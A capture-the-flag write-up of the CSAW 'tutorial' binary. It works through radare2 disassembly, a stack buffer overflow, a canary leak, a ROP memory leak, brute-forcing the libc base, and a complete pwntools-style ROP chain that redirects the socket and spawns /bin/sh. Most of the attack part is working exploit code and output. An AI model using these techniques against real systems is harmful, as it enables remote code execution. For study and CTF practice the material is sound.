# problem
Given :
 * the binary - `tutorial`
 * a copy of their libc - `libc-2.19.so`
 * an endpoint - `nc pwn.chal.csaw.io 8002`

The program output looked something like :
```
-Tutorial-
1.Manual
2.Practice
3.Quit
>1
Reference:0x7ffca446169c
-Tutorial-
1.Manual
2.Practice
3.Quit
>2
Time to test your exploit...
>AA
AA
XXXXXX-Tutorial-
1.Manual
2.Practice
3.Quit
>3
You still did not solve my challenge.
```

# solution
## investigation
To decompile the executable I used radare2 and quickly found the function where a buffer overrun was achievable.
```
$ r2 -A tutorial
[0x00400c90]> pdf @ sym.func2                                                                                                                
/ (fcn) sym.func2 176
|           ; var int local_144h @ rbp-0x144
|           ; var int local_140h @ rbp-0x140
|           ; var int local_8h @ rbp-0x8
|           ; CALL XREF from 0x0040104e (sym.menu)
|           0x00400ef2      55             push rbp
|           0x00400ef3      4889e5         mov rbp, rsp
|           0x00400ef6      4881ec500100.  sub rsp, 0x150
|           0x00400efd      89bdbcfeffff   mov dword [rbp - local_144h], edi
|           0x00400f03      64488b042528.  mov rax, qword fs:[0x28]    ; [0x28:8]=0x2240 ; '('
|           0x00400f0c      488945f8       mov qword [rbp - local_8h], rax
|           0x00400f10      31c0           xor eax, eax
|           0x00400f12      488d85c0feff.  lea rax, [rbp - local_140h]
|           0x00400f19      be2c010000     mov esi, 0x12c
|           0x00400f1e      4889c7         mov rdi, rax
|           0x00400f21      e8dafcffff     call sym.imp.bzero
|           0x00400f26      8b85bcfeffff   mov eax, dword [rbp - local_144h]
|           0x00400f2c      ba1d000000     mov edx, 0x1d
|           0x00400f31      be52134000     mov esi, str.Time_to_test_your_exploit..._n ; "Time to test your exploit...." @ 0x401352
|           0x00400f36      89c7           mov edi, eax
|           0x00400f38      e8a3fbffff     call sym.imp.write
|           0x00400f3d      8b85bcfeffff   mov eax, dword [rbp - local_144h]
|           0x00400f43      ba01000000     mov edx, 1
|           0x00400f48      be70134000     mov esi, 0x401370
|           0x00400f4d      89c7           mov edi, eax
|           0x00400f4f      e88cfbffff     call sym.imp.write
|           0x00400f54      488d8dc0feff.  lea rcx, [rbp - local_140h]
|           0x00400f5b      8b85bcfeffff   mov eax, dword [rbp - local_144h]
|           0x00400f61      bacc010000     mov edx, 0x1cc
|           0x00400f66      4889ce         mov rsi, rcx
|           0x00400f69      89c7           mov edi, eax
|           0x00400f6b      e8f0fbffff     call sym.imp.read
|           0x00400f70      488d8dc0feff.  lea rcx, [rbp - local_140h]
|           0x00400f77      8b85bcfeffff   mov eax, dword [rbp - local_144h]
|           0x00400f7d      ba44010000     mov edx, 0x144
|           0x00400f82      4889ce         mov rsi, rcx
|           0x00400f85      89c7           mov edi, eax
|           0x00400f87      e854fbffff     call sym.imp.write
|           0x00400f8c      488b45f8       mov rax, qword [rbp - local_8h]
|           0x00400f90      644833042528.  xor rax, qword fs:[0x28]
|       ,=< 0x00400f99      7405           je 0x400fa0
|       |   0x00400f9b      e860fbffff     call sym.imp.__stack_chk_fail
|       |   ; JMP XREF from 0x00400f99 (sym.func2)
|       `-> 0x00400fa0      c9             leave
\           0x00400fa1      c3             ret
```
Indeed 0x1cc bytes are read (`0x00400f61 mov edx, 0x1cc`), while the stack frame is only 0x150 bytes large (`0x00400ef6 sub rsp, 0x150`). However, during the function prelude, a canary value is placed at the start of the stack frame.
```
0x00400f03 mov rax, qword fs:[0x28]
0x00400f0c mov qword [rbp - local_8h], rax
```
It is then checked again when the function exits and the program aborts if its value is unexpected.
```
0x00400f8c mov rax, qword [rbp - local_8h]
0x00400f90 xor rax, qword fs:[0x28]
0x00400f99 je 0x400fa0
0x00400f9b call sym.imp.__stack_chk_fail
```
The second limitation is NX. The stack is not executale which means ROP chains will have to be used.

Solving this will end up being a three step process : 
 * find a way to bypass the canary
 * build a rop chain to leak memory (libc base)
 * build a final rop chain to pop a shell

## bypassing the canary
It turns outs that the Practice step of the program writes a tiny bit more than it should (the XXXXXX bytes in my example) and thus conviniently leaks the canary as well as the 4 lowest bytes of the previous frame pointer.

Just what we need :)

Indeed our stack looks like this :
```
<------   [4 bytes file descriptor][0x138 bytes reading space][8 bytes canary][rbp (the previous frame pointer)][return address]
top of                                                                                                                           bottom of
stack                                                                                                                                stack
```
And since write is asked to print 0x144 bytes (`0x00400f7d mov edx, 0x144`), it also prints 12 (0x144 - 0x138) extra bytes.
```python
r = remote("pwn.chal.csaw.io",8002)
# obtain the canary
print(r.recvuntil(">"))
r.send("2\n")
print(r.recvuntil(">"))
r.send("w\n") 
canary = r.recvuntil("-")[0x138:-1]
# overrun the buffer without being detected
r.send("A"*0x138 + canary)
```
Great, sending this does not crash the program which means we can write over ret and control the executable.

## leaking arbitrary memory chunks
Looking at the state of our registers when we reach the ret call we see that we are still configured to perform a write call on the socket.
We only need to change rsi to a new address and call write again to get 0x144 bytes of juicy data.
Uploading the binary to [ropshell.com](http://ropshell.com/), I was able to find a pop rsi; pop r15; ret gadget at 0x4012e1.

```python
def leak(ptr, size):
  r = remote("pwn.chal.csaw.io",8002)
  # obtain the canary
  print(r.recvuntil(">"))
  r.send("2\n")
  print(r.recvuntil(">"))
  r.send("w\n")
  canary = r.recvuntil("-")[0x138:-1]
  canary = canary[:-4]

  print(r.recvuntil(">"))
  r.send("2\n")
  print(r.recvuntil(">"))
  r.send("A"*0x138 + canary + "A"*8 + '\xe1\x12\x40\x00\x00\x00\x00\x00' + struct.pack("Q",ptr) + "A"*8 + '\xa0\x0e\x40\x00\x00\x00\x00\x00')
  r.recv(0x144)
  mem = r.recv(0x144)[:size]
  r.close()
  return mem
```
Once it hits the ret call, the program will pop the address at which we want to leak memory into rsi, pop garbage into r15, and return to the write call at 0x400ea0.

## final exploit
Reversing the code to understand what the reference adresse was it seemed to be linked to the puts function. However I failed to get a valid base doing `libc_base = Reference - libc_puts` and resorted to a different strategy. (In hindsight, I found out that the program also substract 0x500 to the reference it leaks.)

Our friend from RingZer0 [uaf.io](http://uaf.io/exploitation/misc/2016/04/02/Finding-Functions.html) tells us the libc base will be at a multiple of the page size 0x1000 and can be found through brute force.
```python
def findLibcBase(ptr):
   ptr &= 0xfffffffffffff000
   while leak(ptr, 4) != "\x7fELF":
      ptr -= 0x1000
   return ptr
```
Letting this run for a while gives us `libc = 0x7f6dd350b000`.

We now have so many ROP possiblities! 

The final hurdle will consist in hooking the program's standard io to the file descriptor of the socket. Using our leaking function we find its value is 4 and thus we need to `close(0); close(1); dup(4); dup(4);`.
```python
libc = 0x7f6dd350b000
pivot = 0x400e60
dup = libc+0x000ebe60
poprdi = libc+0x00022b9a
close = libc+0x000ebe09
binstr = libc+0x17c8c3
poprdx = libc+0x000bcdf0
poprsi = libc+0x00024885
poprax = libc+0x000487a8
syscall = libc+0x000c1d05
ret = 0x004012fc

def crack(putsadr):
  r = remote("pwn.chal.csaw.io",8002)
  # leak the canary
  print(r.recvuntil(">"))
  r.send("2\n")
  print(r.recvuntil(">"))
  r.send("w\n")
  canary = r.recvuntil("-")[0x138:-1]
  # manually attempted '\xff\x7f\x00\x00' -> '\xfe\x7f\x00\x00' -> '\xfd\x7f\x00\x00'
  rbp = struct.unpack("Q", canary[8:] + '\xfd\x7f\x00\x00')
  canary = canary[:-4]

  print(r.recvuntil(">"))
  r.send("2\n")
  print(r.recvuntil(">"))

  r.send("A"*8 +
        struct.pack("Q", poprdi) +
        struct.pack("Q", 0) +
        struct.pack("Q", close) +
        struct.pack("Q", poprdi) +
        struct.pack("Q", 1) +
        struct.pack("Q", close) +
        struct.pack("Q", poprdi) +
        struct.pack("Q", 4) +
        struct.pack("Q", dup) +
        struct.pack("Q", dup) +
        struct.pack("Q", poprdi) +
        struct.pack("Q", binstr) +
        struct.pack("Q", poprdx) +
        struct.pack("Q", 0) +
        struct.pack("Q", poprsi) +
        struct.pack("Q", 0) +
        struct.pack("Q", poprax) +
        struct.pack("Q", 0x3b) +

        struct.pack("Q", syscall) +
        "A"*0x98 + canary + struct.pack("Q", rbp[0]-0x28-0x148) + struct.pack("Q", pivot))
  print(r.recv())
  r.interactive()
```

```
./tuto.py
$ ls
flag
tutorial
tutorial.c
$ cat flag
FLAG{3ASY_R0P_R0P_P0P_P0P_YUM_YUM_CHUM_CHUM}
```
+200 pts! :tada:
